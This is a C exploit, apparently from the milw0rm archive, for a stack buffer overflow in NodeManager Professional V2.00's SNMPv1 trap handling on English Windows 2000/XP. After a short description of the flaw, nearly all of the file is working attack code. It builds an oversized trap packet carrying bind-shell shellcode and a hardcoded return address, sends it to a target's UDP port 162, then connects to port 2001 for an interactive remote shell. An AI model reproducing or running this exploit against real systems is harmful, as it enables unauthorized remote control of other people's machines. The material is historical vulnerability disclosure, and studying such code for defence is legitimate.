@@ -1,0 +1,255 @@
+/* Included stdio.h for my compile errors /str0ke */
+//**************************************************************************
+// NodeManager Professional V2.00 Buffer Overflow Vulnerability
+// Bind Shell Exploit for English Win2K/XP
+// 21 Dec 2004
+//
+// NodeManager Professional is a network management and monitoring tool.
+// It receives SNMPv1 traps and displays them on screen and logs them to
+// a file.  NodeManager Professional V2.00 has a stack overflow
+// vulnerability that can be exploited by sending a specially crafted
+// SNMPv1 trap.
+//
+// NodeManager Professional allows the user to use a format string to
+// customize how each received trap is logged.  For example, the default
+// format string for the LinkDown event is
+//
+// "Snmp Trap LinkDown (EnterPrise=%EPRISE ObjectID=%OID Value=%DATA)"
+//
+// When a LinkDown-Trap packet is received, the various placeholders
+// (e.g. %OID, %DATA) will be replaced with the received values.  The
+// resulting string is then displayed on screen and written out to a log file.
+// The various fields from the received LinkDown-Trap UDP packet is first copied
+// to global buffers in the .data segment.  When the format string is parsed,
+// each received value is first copied to a 512-byte local stack buffer before
+// it is concatenated to the final string.
+//
+// By sending more than 512 bytes in the Trap DATA field, it is possible
+// to overflow the stack buffer and overwrite the EIP.
+//
+//
+// This exploit code binds shell on port 2001 of a system running a vulnerable
+// version of NodeManager Professional.
+//
+// Advisory
+// http://www.security.org.sg/vuln/nodemanager200.html
+//
+// Greetz: snooq, sk, and all guys at SIG^2 G-TEC
+// (http://www.security.org.sg/webdocs/g-tec.html)
+//
+//**************************************************************************
+
+#include <windows.h>
+#include <winsock2.h>
+#include <string.h>
+#include <malloc.h>
+#include <conio.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#pragma comment(lib,"ws2_32.lib")
+
+unsigned char evilTrap[] =
+"\x30\x82\x02\x44\x02\x01\x00\x04\x06\x70\x75\x62\x6C\x69\x63\xA4"
+"\x82\x02\x35\x06\x09\x2B\x06\x01\x02\x03\x04\x05\x06\x07\x40\x04"
+"\x7F\x00\x00\x01\x02\x01\x02\x02\x01\x00\x43\x02\x12\x34\x30\x82"
+"\x02\x16\x30\x82\x02\x12\x06\x08\x2B\x06\x01\x02\x03\x04\x05\x06"
+"\x04\x82\x02\x04\x41\x41\x41\x41\x41\x41\x41\x41\x90\x90\x90\xCC"
+
+		// bindshell on port 2001
+        "\xEB\x62\x55\x8B\xEC\x51\x56\x57\x8B\x5D\x08\x8B\x73\x3C\x8B\x74"
+        "\x33\x78\x03\xF3\x8B\x7E\x20\x03\xFB\x8B\x4E\x18\x56\x33\xD2\x8B"
+        "\x37\x03\x75\x08\x33\xDB\x33\xC0\xAC\x85\xC0\x74\x09\xC1\xCB\x0C"
+        "\xD1\xCB\x03\xD8\xEB\xF0\x3B\x5D\x0C\x74\x0B\x83\xC7\x04\x42\xE2"
+        "\xDE\x5E\x33\xC0\xEB\x17\x5E\x8B\x7E\x24\x03\x7D\x08\x66\x8B\x04"
+        "\x57\x8B\x7E\x1C\x03\x7D\x08\x8B\x04\x87\x03\x45\x08\x5F\x5E\x59"
+        "\x8B\xE5\x5D\xC3\x55\x8B\xEC\x33\xC9\xB1\xC8\x2B\xE1\x32\xC0\x8B"
+        "\xFC\xF3\xAA\xB1\x30\x64\x8B\x01\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B"
+        "\x58\x08\x89\x5D\xFC\x68\x8E\x4E\x0E\xEC\xFF\x75\xFC\xE8\x70\xFF"
+        "\xFF\xFF\x83\xC4\x08\xBB\xAA\xAA\x6C\x6C\xC1\xEB\x10\x53\x68\x33"
+        "\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD0\x89\x45\xF8\xEB\x35"
+        "\x5E\x8D\x7D\xF4\x33\xC9\xB1\x09\xFF\x36\xFF\x75\xFC\xE8\x40\xFF"
+        "\xFF\xFF\x83\xC4\x08\x85\xC0\x75\x0E\x90\xFF\x36\xFF\x75\xF8\xE8"
+        "\x2E\xFF\xFF\xFF\x83\xC4\x08\x89\x07\x33\xC0\xB0\x04\x03\xF0\x2B"
+        "\xF8\xE2\xD5\xEB\x29\xE8\xC6\xFF\xFF\xFF\x72\xFE\xB3\x16\x35\x54"
+        "\x8A\xA1\xA4\xAD\x2E\xE9\xA4\x1A\x70\xC7\xD9\x09\xF5\xAD\xCB\xED"
+        "\xFC\x3B\x7E\xD8\xE2\x73\xE7\x79\xC6\x79\xAD\xD9\x05\xCE\x54\x6A"
+        "\x02\xFF\x55\xE0\x33\xC0\x50\x50\x50\x50\x6A\x01\x6A\x02\xFF\x55"
+        "\xE4\x89\x45\xD0\x33\xC0\x50\xB8\xFD\xFF\xF8\x2E\x83\xF0\xFF\x50"
+        "\x8B\xC4\x6A\x10\x50\xFF\x75\xD0\xFF\x55\xE8\x6A\x05\xFF\x75\xD0"
+        "\xFF\x55\xEC\x85\xC0\x75\x68\x8B\xCC\x6A\x10\x8B\xDC\x33\xC0\x50"
+        "\x50\x53\x51\xFF\x75\xD0\xFF\x55\xF0\x8B\xD0\x5B\x83\xF0\xFF\x74"
+        "\x4E\x8B\xFC\x33\xC9\xB1\x64\x33\xC0\xF3\xAA\xC6\x04\x24\x44\x66"
+        "\xC7\x44\x24\x2C\x01\x01\x89\x54\x24\x38\x89\x54\x24\x3C\x89\x54"
+        "\x24\x40\x8B\xC4\x8D\x58\x44\xB9\xFF\x63\x6D\x64\xC1\xE9\x08\x51"
+        "\x8B\xCC\x52\x53\x53\x50\x33\xC0\x50\x50\x50\x6A\x01\x50\x50\x51"
+        "\x50\xFF\x55\xF4\x5B\x6A\xFF\xFF\x33\xFF\x55\xD4\xFF\x55\xD8\xFF"
+        "\x75\xD0\xFF\x55\xD8\x50\xFF\x55\xDC\x41\x41\x41\x41\x41\x41\x41"
+
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41"
+"\x9C\x48\x43\x00";		// hardcoded return address (in data segment)
+
+
+void shell(int sockfd)
+{
+	char buffer[1024];
+	fd_set rset;
+	FD_ZERO(&rset);
+
+	for(;;)
+	{
+		if(kbhit() != 0)
+		{
+			fgets(buffer, sizeof(buffer) - 2, stdin);
+			send(sockfd, buffer, strlen(buffer), 0);
+		}
+
+		FD_ZERO(&rset);
+		FD_SET(sockfd, &rset);
+
+		timeval tv;
+		tv.tv_sec = 0;
+		tv.tv_usec = 50;
+
+		if(select(0, &rset, NULL, NULL, &tv) == SOCKET_ERROR)
+		{
+			printf("select error\n");
+			break;
+		}
+
+		if(FD_ISSET(sockfd, &rset))
+		{
+			int n;
+
+			ZeroMemory(buffer, sizeof(buffer));
+			if((n = recv(sockfd, buffer, sizeof(buffer), 0)) <= 0)
+			{
+				printf("EOF\n");
+				return;
+			}
+			else
+			{
+				fwrite(buffer, 1, n, stdout);
+			}
+		}
+	}
+}
+
+
+void printUsage(char *filename)
+{
+		printf("\nUsage: %s <test type> <ip addr>\n\n", filename);
+		printf("Test Type : 1 - Crash\n");
+		printf("            2 - BindShell on Port 2001\n\n");
+}
+
+int main(int argc, char* argv[])
+{
+	int sock;
+	WSADATA wsd;
+
+	if(argc != 3)
+	{
+		printUsage(argv[0]);
+		return 1;
+	}
+	int testType = atoi(argv[1]);
+	if(testType != 1 && testType != 2)
+	{
+		printUsage(argv[0]);
+		return 1;
+	}
+
+	if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
+	{
+		printf("WSAStartup() failed: %d\n", GetLastError());
+		return -1;
+	}
+
+	sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if(sock < 0)
+	{
+		printf("socket() error!\n");
+		WSACleanup();
+		return 1;
+	}
+
+	struct sockaddr_in dest;
+	dest.sin_family = AF_INET;
+	dest.sin_port = htons(162);
+	dest.sin_addr.s_addr = inet_addr(argv[2]);
+
+	struct sockaddr_in local;
+	local.sin_family = AF_INET;
+	local.sin_port = htons(0);
+	local.sin_addr.s_addr = htonl(INADDR_ANY);
+
+	if(bind(sock, (struct sockaddr *)&local, sizeof(local)) < 0)
+	{
+		printf("Exploit Failed. SOCKET_ERROR return in bind() call.\n");
+		closesocket(sock);
+		WSACleanup();
+		return 1;
+	}
+
+	if(testType == 1)
+	{
+		DWORD *ptr = (DWORD *)(evilTrap + sizeof(evilTrap) - 5);
+		*ptr = 0x41414141;
+
+	}
+
+	int structLen = sizeof(dest);
+
+	int sendSize = sendto(sock, (char *)evilTrap, sizeof(evilTrap)-1, 0, (struct sockaddr *)&dest, structLen);
+
+	if(sendSize < 0)
+	{
+		printf("Exploit Failed. SOCKET_ERROR return in sendto() call.\n");
+	}
+	else
+		printf("Exploit Sent. Size: %d bytes\n", sendSize);
+
+	if(testType == 2)
+		printf("Connecting to port 2001 on target. . .");
+	Sleep(2000);
+	closesocket(sock);
+
+	if(testType == 2)
+	{
+		struct sockaddr_in sin;
+		//================================= Connect to the target ==============================
+		sock = socket(AF_INET, SOCK_STREAM, 0);
+		if(sock == INVALID_SOCKET)
+		{
+			printf("\nInvalid socket return in socket() call.\n");
+			WSACleanup();
+			return -1;
+		}
+
+		sin.sin_family = AF_INET;
+		sin.sin_port = htons(2001);
+		sin.sin_addr.s_addr = inet_addr(argv[2]);
+
+		if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
+		{
+			printf("\nExploit Failed. SOCKET_ERROR return in connect() call.\n");
+			closesocket(sock);
+			WSACleanup();
+			return -1;
+		}
+		printf("\n\nSuccess!\n\n");
+		shell(sock);
+
+		closesocket(sock);
+	}
+
+	WSACleanup();
+
+	return 0;
+}
+
+// milw0rm.com [2005-01-18]
